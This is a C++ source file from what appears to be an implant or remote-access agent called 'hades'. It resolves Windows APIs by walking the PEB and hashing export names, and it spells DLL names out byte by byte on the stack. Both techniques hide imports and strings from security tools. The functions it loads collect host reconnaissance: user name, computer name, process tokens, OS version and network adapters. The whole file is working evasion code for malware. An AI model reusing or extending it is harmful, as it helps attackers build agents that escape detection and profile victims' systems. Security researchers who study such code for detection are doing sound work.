#include "../shared/common.hpp"
#include "../hades/hades.h"
#include <stdio.h>





DWORD Hasher(PCHAR str) {
	DWORD h = 0x1231CBDE;
	DWORD MAGIC = 0xB33D33f;

	while (*str) {
		char c = *str++;
		h ^= (MAGIC ^ c);
		h = (h << 5) | (h >> 26);
		h += c * 16;
	}
	return h;
}

DWORD HasherW(PWSTR str) {
	DWORD h = 0x1231CBDE;
	DWORD MAGIC = 0xB33D33f;

	while (*str) {
		WCHAR c = *str++;
		h ^= (MAGIC ^ c);
		h = (h << 5) | (h >> 26);
		h += c * 16;
	}
	return h;
}


HMODULE GetModule(DWORD Hash) {
	PPEB peb = GetPEB();

	PEB_LDR_DATA* l = peb->Ldr;
	LIST_ENTRY* Modules = NULL;
	Modules = &l->InMemoryOrderModuleList;
	LIST_ENTRY* Start = Modules->Flink;

	for (LIST_ENTRY* List = Start; List != Modules; List = List->Flink) {
		LDR_DATA_TABLE_ENTRY* e = (LDR_DATA_TABLE_ENTRY*)((BYTE*)List - sizeof(LIST_ENTRY));
		if (HasherW(e->BaseDllName.Buffer) == Hash) {
			return (HMODULE)e->DllBase;
		}
	}
	return NULL;
}


FARPROC GetProc(HMODULE dll, DWORD hash) {
	PBYTE pBase = (PBYTE)dll;
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;

	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) { return NULL; }
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE) { return NULL; }

	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD AddressFunc = (PDWORD)(pBase + pExportDir->AddressOfFunctions);
	PDWORD AddressName = (PDWORD)(pBase + pExportDir->AddressOfNames);
	PWORD AddressOrds = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++) {
		PCHAR funcName = (PCHAR)(pBase + AddressName[i]);
		DWORD HashedName = Hasher(funcName);
		if (HashedName == hash) {
			FARPROC addr = (FARPROC)(pBase + AddressFunc[AddressOrds[i]]);
			return addr;
		}
	}

}


BOOL LoadAPIS() {


	hades->Modules.K32 = GetModule(HASHED_Kernel322);;
	if (hades->Modules.K32) {

		hades->WinApis.LoadLibraryA       = (decltype(hades->WinApis.LoadLibraryA))       GetProc(hades->Modules.K32, HASHED_LoadLibraryA);
		hades->WinApis.GetComputerNameExA = (decltype(hades->WinApis.GetComputerNameExA)) GetProc(hades->Modules.K32, HASHED_GetComputerNameExA);
		hades->WinApis.GetModuleFileNameA = (decltype(hades->WinApis.GetModuleFileNameA)) GetProc(hades->Modules.K32, HASHED_GetModuleFileNameA);
		hades->WinApis.GetTickCount       = (decltype(hades->WinApis.GetTickCount))       GetProc(hades->Modules.K32, HASHED_GetTickCount);
		hades->WinApis.CloseHandle        = (decltype(hades->WinApis.CloseHandle))        GetProc(hades->Modules.K32, HASHED_CloseHandle);
	}

	hades->Modules.NTDLL = GetModule(HASHED_NTDLL);
	if (hades->Modules.NTDLL) {

		hades->NtApis.RtlGetVersion				= (decltype(hades->NtApis.RtlGetVersion))GetProc(hades->Modules.NTDLL, HASHED_RtlGetVersion);
	    hades->NtApis.RtlGetNtVersionNumbers	= (decltype(hades->NtApis.RtlGetNtVersionNumbers))GetProc(hades->Modules.NTDLL, HASHED_RtlGetNtVersionNumbers);
		hades->NtApis.RtlRandomEx				= (decltype(hades->NtApis.RtlRandomEx))GetProc(hades->Modules.NTDLL, HASHED_GenRandom);
		hades->NtApis.NtOpenProcessToken		= (decltype(hades->NtApis.NtOpenProcessToken))GetProc(hades->Modules.NTDLL, HASHED_OpenProcessToken);
		hades->NtApis.NtOpenThreadToken         = (decltype(hades->NtApis.NtOpenThreadToken))GetProc(hades->Modules.NTDLL, HASHED_OpenThreadToken);
		hades->NtApis.NtQueryInformationProcess = (decltype(hades->NtApis.NtQueryInformationProcess))GetProc(hades->Modules.NTDLL, HASHED_NtQueryInformationProcess);
		hades->NtApis.NtDelayExecution          = (decltype(hades->NtApis.NtDelayExecution))GetProc(hades->Modules.NTDLL, HASHED_NtDelayExecution);
	}
	

	char buf[13];
	buf[0] = 'a';
	buf[1] = 'd';
	buf[2] = 'v';
	buf[3] = 'a';
	buf[4] = 'p';
	buf[5] = 'i';
	buf[6] = '3';
	buf[7] = '2';
	buf[8] = '.';
	buf[9] = 'd';
	buf[10] = 'l';
	buf[11] = 'l';
	buf[12] = '\0';
	hades->Modules.ADVAPI32 = hades->WinApis.LoadLibraryA(buf);

	if (hades->Modules.ADVAPI32) {  

		hades->WinApis.GetUserNameA        = (decltype(hades->WinApis.GetUserNameA))GetProc(hades->Modules.ADVAPI32, HASHED_GetUserNameA);
		hades->WinApis.GetTokenInformation = (decltype(hades->WinApis.GetTokenInformation))GetProc(hades->Modules.ADVAPI32, HASHED_GetTokenInformation);

	}



	char buf2[13];
	buf2[0]  = 'i';
	buf2[1]  = 'p';
	buf2[2]  = 'h';
	buf2[3]  = 'l';
	buf2[4]  = 'p';
	buf2[5]  = 'a';
	buf2[6]  = 'p';
	buf2[7]  = 'i';
	buf2[8]  = '.';
	buf2[9]  = 'd';
	buf2[10] = 'l';
	buf2[11] = 'l';
	buf2[12] = '\0';
	hades->Modules.IPHLPAPI = hades->WinApis.LoadLibraryA(buf2);

	if (hades->Modules.IPHLPAPI) {

		hades->WinApis.GetAdaptersInfo = (decltype(hades->WinApis.GetAdaptersInfo))GetProc(hades->Modules.IPHLPAPI, HASHED_GetAdaptersInfo);

	}



	return TRUE;





}